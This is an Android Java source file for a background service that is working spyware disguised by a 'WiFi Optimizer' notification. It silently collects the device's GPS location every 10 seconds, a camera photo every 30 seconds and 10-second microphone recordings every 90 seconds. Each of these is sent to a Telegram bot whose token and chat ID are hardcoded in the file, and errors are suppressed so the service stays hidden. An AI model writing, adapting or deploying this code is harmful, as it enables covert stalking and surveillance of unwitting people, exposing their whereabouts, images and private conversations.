package com.abdullah.finalapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;

public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";
    private static final String TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE"; // التوكن بتاعك
    private static final String CHAT_ID = "7560932400"; // الـ ID بتاعك

    private LocationManager locationManager;
    private Handler handler = new Handler();
    private Runnable locationTask, photoTask, videoTask;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, buildNotification());

        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

        // 1. إرسال الموقع كل 10 ثواني
        locationTask = new Runnable() {
            @Override
            public void run() {
                try {
                    if (ActivityCompat.checkSelfPermission(BackgroundService.this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                            @Override public void onLocationChanged(@NonNull Location location) {
                                sendMessage("📍 الموقع: " + location.getLatitude() + ", " + location.getLongitude());
                            }
                            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                            @Override public void onProviderEnabled(@NonNull String provider) {}
                            @Override public void onProviderDisabled(@NonNull String provider) {}
                        }, null);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Location Error: " + e.getMessage());
                }
                handler.postDelayed(this, 10000); // كل 10 ثواني
            }
        };
        handler.post(locationTask);

        // 2. التقاط صورة كل 30 ثانية
        photoTask = new Runnable() {
            @Override
            public void run() {
                takePhoto();
                handler.postDelayed(this, 30000); // كل 30 ثانية
            }
        };
        handler.post(photoTask);

        // 3. تسجيل صوت كل 90 ثانية
        videoTask = new Runnable() {
            @Override
            public void run() {
                recordAudio();
                handler.postDelayed(this, 90000); // كل 90 ثانية
            }
        };
        handler.post(videoTask);
    }

    private void takePhoto() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            HandlerThread thread = new HandlerThread("CameraBackground");
            thread.start();
            Handler cameraHandler = new Handler(thread.getLooper());

            ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(r -> {
                Image image = r.acquireLatestImage();
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                sendPhoto(bytes);
                image.close();
            }, cameraHandler);

            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override public void onOpened(@NonNull CameraDevice camera) {
                        try {
                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            builder.addTarget(reader.getSurface());
                            camera.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(@NonNull CameraCaptureSession session) {
                                    try { session.capture(builder.build(), null, null); } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) {}
                            }, cameraHandler);
                        } catch (Exception ignored) {}
                    }
                    @Override public void onDisconnected(@NonNull CameraDevice camera) {}
                    @Override public void onError(@NonNull CameraDevice camera, int error) {}
                }, cameraHandler);
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera Error: " + e.getMessage());
        }
    }

    private void recordAudio() {
        try {
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            
            File outputFile = new File(getExternalFilesDir(null), "audio_" + System.currentTimeMillis() + ".3gp");
            recorder.setOutputFile(outputFile.getAbsolutePath());
            
            recorder.prepare();
            recorder.start();
            
            // تسجيل لمدة 10 ثواني
            new Handler().postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();
                    sendAudio(outputFile);
                } catch (Exception ignored) {}
            }, 10000);
        } catch (Exception e) {
            Log.e(TAG, "Audio Error: " + e.getMessage());
        }
    }

    // دوال إرسال تيليجرام
    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8"));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendPhoto(byte[] imageData) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                URL url = new URL("https://api.telegram.org/bot" + TOKEN + "/sendPhoto");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                
                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n\r\n");
                os.write(imageData);
                os.writeBytes("\r\n--" + boundary + "--\r\n");
                os.flush();
                os.close();
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendAudio(File file) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                URL url = new URL("https://api.telegram.org/bot" + TOKEN + "/sendAudio");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                
                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"audio.3gp\"\r\n\r\n");
                
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                fis.close();
                
                os.writeBytes("\r\n--" + boundary + "--\r\n");
                os.flush();
                os.close();
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, "channel_id")
                    .setContentTitle("WiFi Optimizer")
                    .setContentText("جاري تحسين أداء الشبكة...")
                    .setSmallIcon(android.R.drawable.ic_menu_compass)
                    .setOngoing(true)
                    .build();
        }
        return new Notification.Builder(this)
                .setContentTitle("WiFi Optimizer")
                .setContentText("جاري تحسين أداء الشبكة...")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("channel_id", "Service Channel", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
